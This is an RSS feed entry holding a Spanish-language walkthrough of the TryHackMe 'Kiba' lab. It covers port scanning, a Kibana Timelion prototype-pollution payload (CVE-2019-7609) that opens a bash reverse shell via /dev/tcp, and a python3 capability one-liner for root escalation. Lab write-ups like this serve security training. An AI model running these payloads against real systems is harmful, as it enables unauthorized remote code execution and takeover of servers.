<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" 
  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
  xmlns:dc="http://purl.org/dc/elements/1.1/" 
  xmlns:atom="http://www.w3.org/2005/Atom" 
  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
  xmlns:media="http://search.yahoo.com/mrss/">
  <channel>
    <title>kibana on sckull</title>
    <link>https://sckull.github.io/tags/kibana/</link>
    <description>Recent content in kibana on sckull</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>es</language>
    <copyright>©{year}, All Rights Reserved</copyright>
    <lastBuildDate>Mon, 31 Aug 2020 00:00:00 +0000</lastBuildDate>
    <sy:updatePeriod>daily</sy:updatePeriod>
    <sy:updateFrequency>daily</sy:updateFrequency>
    
        <atom:link href="https://sckull.github.io/tags/kibana/index.xml" rel="self" type="application/rss+xml" />
    
    
    

      
      <item>
        <title>TryHackMe - Kiba</title>
        <link>https://sckull.github.io/posts/kiba/</link>
        <pubDate>Mon, 31 Aug 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Mon, 31 Aug 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/kiba/</guid>
        <description>Kiba es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Kiba es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Kiba&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Identify the critical security flaw in the data visualization dashboard, that allows execute remote code execution.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;480&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/stuxnet&#34;&gt;stuxnet&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap--masscan&#34;&gt;NMAP &amp;amp; MASSCAN&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto 5601, puerto http (80) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Mon Aug 31 18:26:06 2020 as: nmap -sV -o mini_scan kiba.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; kiba.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.22.111&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.24s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Mon Aug 31 18:26:43 2020 -- 1 IP address (1 host up) scanned in 37.55 seconds&lt;/span&gt;

masscan -p1-65535,U:1-65535 10.10.22.111 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0

Starting masscan 1.0.5 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2020-08-31 22:51:38 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 5601/tcp on 10.10.22.111
Discovered open port 80/tcp on 10.10.22.111
Discovered open port 22/tcp on 10.10.22.111
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 80 con una imagen ASCII de Cicada y con una frase interesante &lt;code&gt;&amp;quot;linux capabilities&amp;quot;&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_16-28-26.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos, no encontramos nada interesante.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/thm/kiba$ gobuster dir -u http://kiba.thm/ -w &lt;span class=&#34;nv&#34;&gt;$LIST&lt;/span&gt;/dirb/common.txt -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http-puerto-5601&#34;&gt;HTTP PUERTO 5601&lt;/h2&gt;
&lt;p&gt;Encontramos el dashboard de kibana.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_16-56-39.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Realizamos un query (&lt;code&gt;_aliases&lt;/code&gt; y &lt;code&gt;.kibana/_search&lt;/code&gt; ambos GET) en la consola de &lt;code&gt;Dev Tools&lt;/code&gt; para ver la version de kibana y vemos que es &lt;code&gt;6.5.4&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_17-21-46.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;kibana--660---rce&#34;&gt;KIBANA &amp;lt; 6.6.0 - RCE&lt;/h2&gt;
&lt;p&gt;Realizamos una busqueda de posibles exploits o vulnerabilidades para esta version de Kibana y encontramos un &lt;a href=&#34;https://slides.com/securitymb/prototype-pollution-in-kibana/#/54/0/0&#34;&gt;&lt;strong&gt;PoC que permite ejecutar comandos&lt;/strong&gt;&lt;/a&gt; a traves de la &amp;ldquo;contaminacion de un objeto&amp;rdquo;. Encontramos informacion de otros dos payloads y de como parchar esta vulnerabilidad en &lt;a href=&#34;https://github.com/mpgn/CVE-2019-7609&#34;&gt;&lt;strong&gt;Github&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Utilizamos el payload para obtener una shell inversa con los pasos que se muestran en el &lt;a href=&#34;https://slides.com/securitymb/prototype-pollution-in-kibana/#/54/0/0&#34;&gt;&lt;strong&gt;slide&lt;/strong&gt;&lt;/a&gt; y logramos obtener una shell.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;.es&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.props&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;label.__proto__.env.AAAA&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;require(&amp;#34;child_process&amp;#34;).exec(&amp;#34;bash -c \&amp;#39;&lt;/span&gt;bash -i&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; /dev/tcp/10.10.10.10/12345 0&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;1&lt;span class=&#34;se&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;);//&amp;#39;)
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;.props(label.__proto__.env.NODE_OPTIONS=&amp;#39;--require /proc/self/environ&amp;#39;)
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_17-35-43.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_17-36-08.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Logramos obtener nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_17-36-44.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Hacemos una pequeña enumeracion y vemos algunas configuraciones realizadas en un archivo que se encuentra en la carpeta principal que esta relacionada con capabilities, lo cual esta relacionado con la frase que encontramos en la pagina del puerto 80.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_17-40-47.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Realizamos una enumeracion con &lt;code&gt;getcap -r / 2&amp;gt;/dev/null&lt;/code&gt; para verificar que el archivo visto en el historial contiene estas &amp;ldquo;capacidades&amp;rdquo; (similares a los SUID). Vemos que aparece junto a otros.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_17-43-52.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Realizamos la explotacion de este archivo, que es python3 para obtener una shell root y nuestra flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;./python3 -c &lt;span class=&#34;s1&#34;&gt;&amp;#39;import os; os.setuid(0); os.system(&amp;#34;/bin/bash&amp;#34;)&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_17-48-47.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Informacion:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/&#34;&gt;&lt;strong&gt;Capabilities - Privilege Escalation&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/&#34;&gt;&lt;strong&gt;Capabilities - Privilege Escalation&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://twitter.com/chybeta/status/1184479040645632001&#34;&gt;&lt;strong&gt;Kibana - PoC&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.synacktiv.com/en/publications/pwning-an-outdated-kibana-with-not-so-sad-vulnerabilities.html&#34;&gt;&lt;strong&gt;Kibana - Sad Vulnerabilities&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/kiba/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/kiba/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
            
              <category>kibana</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      

    
  </channel>
</rss>